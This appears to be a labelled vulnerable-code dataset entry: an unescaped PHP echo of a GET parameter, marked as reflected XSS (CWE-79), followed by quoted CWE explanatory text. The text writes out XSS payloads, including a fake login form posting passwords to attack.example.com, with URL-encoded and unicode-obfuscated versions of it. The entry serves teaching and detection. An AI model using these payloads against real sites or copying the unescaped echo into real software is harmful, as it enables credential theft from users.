```
	$username = $_GET['username'];
	echo '<div class="header"> Welcome, ' . $username . '</div>';
```


//Result: 
 // Vulnerable (01)
//
//
//
////Issue: CWE-79 - Cross-Site Scripting (XSS)
//
//
//
//URL: https://cwe-api.mitre.org/api/v1/cwe/weakness/79
//

//Source: CWE Mitre
//

//Extra context: 
// The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).
// Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as
// ```
	http://trustedSite.example.com/welcome.php?username=<Script Language="Javascript">alert("You've been attacked!");</Script>
```
// This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.
// More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:
// ```
	http://trustedSite.example.com/welcome.php?username=<div id="stealPassword">Please Login:<form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" /><br/>Password: <input type="password" name="password" /><br/><input type="submit" value="Login" /></form></div>
```
// If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:
// The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):
// ```
	trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
	stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
	%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
	%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
	%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
	+%3Cinput+type%3D%22password%22+name%3D%22password%22
	+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
	+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
```
// The same attack string could also be obfuscated as:
// ```
	trustedSite.example.com/welcome.php?username=<script+type="text/javascript">
	document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
	\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
	\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
	\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
	\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
	\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
	\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
	\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
	\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
	\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
	\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
	\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
	\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
	\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
	\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
	\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
	\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
	\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
	\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
	\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
	\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
	\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
	\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>
```
// Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.